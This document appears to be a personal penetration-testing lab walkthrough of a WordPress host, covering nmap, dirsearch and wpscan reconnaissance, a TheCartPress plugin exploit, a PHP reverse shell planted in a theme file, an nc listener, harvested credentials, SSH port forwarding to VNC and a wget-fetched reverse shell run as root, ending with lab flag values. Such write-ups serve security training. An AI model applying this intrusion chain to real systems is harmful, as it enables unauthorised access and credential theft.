```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV 192.168.119.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 14:25 EST
Nmap scan report for 192.168.119.110
Host is up (0.068s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 81b21fff3206e8b602565e82a3414781 (RSA)
|   256 cf2178298bfbc121f63799308d1d6cc3 (ECDSA)
|_  256 de2221d7a09efed55b72a202c19b67bc (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: crunch &#8211; An apple a day, keeps the doctor away&#8230;
|_http-generator: WordPress 5.9.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.84 seconds
```

```shell
#wordpress login 

─(root㉿kali)-[/home/kali/Documents/test]
└─# dirsearch -u http://192.168.119.110:80 -x 400,401,403 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/192.168.119.110-80/_23-03-10_14-27-48.txt

Error Log: /root/.dirsearch/logs/errors-23-03-10_14-27-48.log

Target: http://192.168.119.110:80/

[14:27:49] Starting: 


[14:30:38] 200 -   19KB - /license.txt
[14:31:19] 200 -    7KB - /readme.html
[14:31:22] 200 -  115B  - /robots.txt
[14:31:30] 200 -   40KB - /sign-in/
[14:31:57] 200 -    0B  - /wp-content/
	[14:31:57] 200 -    0B  - /wp-config.php
	[14:31:57] 200 -    1KB - /wp-admin/install.php 
[14:31:58] 200 -    0B  - /wp-includes/rss-functions.php
[14:31:58] 200 -    0B  - /wp-cron.php
[14:31:58] 200 -  580B  - /wp-json/wp/v2/users/
action=register
[14:31:59] 200 -  156KB - /wp-json/
[14:31:59] 301 -    0B  - /www/phpMyAdmin/index.php  ->  http://192.168.119.110/www/phpMyAdmin/
[14:31:59] 301 -    0B  - /xampp/phpmyadmin/index.php  ->  http://192.168.119.110/xampp/phpmyadmin/
[14:32:00] 405 -   42B  - /xmlrpc.php
```

```shell
#trying wpscan on website to find vulnerable plugins

wpscan --url http://192.168.119.110 --enumerate AP,at,cb,dbe



"tcp_new_user_name" : "admin_02",
	"tcp_new_user_pass" : "admin1234",


┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# wpscan --url http://192.168.119.110/ --enumerate ap,at,cb,dbe
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.119.110/ [192.168.119.110]
[+] Started: Fri Mar 10 15:35:57 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://192.168.119.110/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.119.110/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.119.110/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.119.110/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9.1 identified (Insecure, released on 2022-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.119.110/feed/, <generator>https://wordpress.org/?v=5.9.1</generator>
 |  - http://192.168.119.110/comments/feed/, <generator>https://wordpress.org/?v=5.9.1</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.119.110/wp-content/themes/twentytwentyone/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://192.168.119.110/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.7
 | Style URL: http://192.168.119.110/wp-content/themes/twentytwentyone/style.css?ver=1.4
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.119.110/wp-content/themes/twentytwentyone/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] thecartpress
 | Location: http://192.168.119.110/wp-content/plugins/thecartpress/
 | Latest Version: 1.5.3.6 (up to date)
 | Last Updated: 2017-01-12T19:25:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.5.3.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.119.110/wp-content/plugins/thecartpress/readme.txt

```

```shell
# found a vulnerable plugin on wordpress
```

![[2 the cart press plugin.png]]

```shell
#searchploit'ed 1.5.3.6 version of wordpress and found this priv esc
```
![[3. searchsploit cartpress version.png]]

```shell
#located exploit and moved to working directory to throw
```
![[4. locate exploite.png]]

```shell
#threw exploit without modifying it
```

![[5. exploit throw.png]]

```shell
#successful login
# begin looking around to find a way to get a reverse shell

```

![[6. successful exploit login.png]]

```shell
# http://192.168.119.110/wp-admin/theme-editor.php?file=404.php&theme=twentytwentyone
# used pentest monkey php reverse shell, unable to post because it will delete my notes.
```

![[7. php reverse shell in 404.php.png]]

```shell
# executed the code by browsing here
http://192.168.119.110/wordpress/wp-content/themes/twentytwentyone/404.php
#setup nc -lvnp 1234 listener

```

```shell
# on as www-data
```
![[8. listener caught.png]]

```shell
#after looking around in the config files previously identified in the dirsearch earlier @ /srv/www/wordpress found some creds 

tequieromucho password
```

![[9. found creds.png]]

```shell
#ran ss -ant to identify connections and notived 5901 open - after using open source research i see that it is vnc, could be used with some port forwarding
```
![[12.5 ss -ant net connection.png]]

```shell
#ssh port forwarding attempt

ssh -R 5901:127.0.0.1:5901 kali@192.168.49.119
```

```shell
# had to start ssh service on my own box

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# service ssh start    
```

```shell
user jsmith
```
![[10. user jsmith.png]]


![[11 ssh login p1.png]]

![[12. ssh login p2.png]]

```shell
#on as jsmith, no tools on box like certutil or ifconfig, need to priv esc.
# tried to xfer linpeas but wasnt able to.
# breaking
```

```shell
#using the ssh port forward able to vncviewer in as root.

```
![[13 port forward ssh.png]]



![[14 proof found.png]]


```shell
#proof.txt found but going to need to get a reverse shell
```


![[15 created reverse shell.png]]

![[16 python3 http server.png]]

```shell
#hosting python3 http server to transfer reverse shell
```

```shell
# in new ssh session opened used wget to transfer reverse shell over.
```

![[17.1 new ssh session for wget.png]]
![[17 wget.png]]

```shell
#chmod +x to make executable.
```
![[18 chmod.png]]

```shell
# executed shell as root being in the vnc, which gave me my reverse shell back as root.
```

![[19 shell.elf executed.png]]


```shell
# local.txt
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:cf:df brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 192.168.119.110/24 brd 192.168.119.255 scope global noprefixroute ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:cfdf/64 scope link 
       valid_lft forever preferred_lft forever
cat local.txt
c0a4eaa42f72ccf366b470f1b0cbafb1

```

![[20 local.txt.png]]

![[21 proof.txt.png]]

```shell
#proof.txt

ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:cf:df brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    inet 192.168.119.110/24 brd 192.168.119.255 scope global noprefixroute ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:cfdf/64 scope link 
       valid_lft forever preferred_lft forever
cat proof.txt
122ab6bd1769962259645c6ebf674f8e

```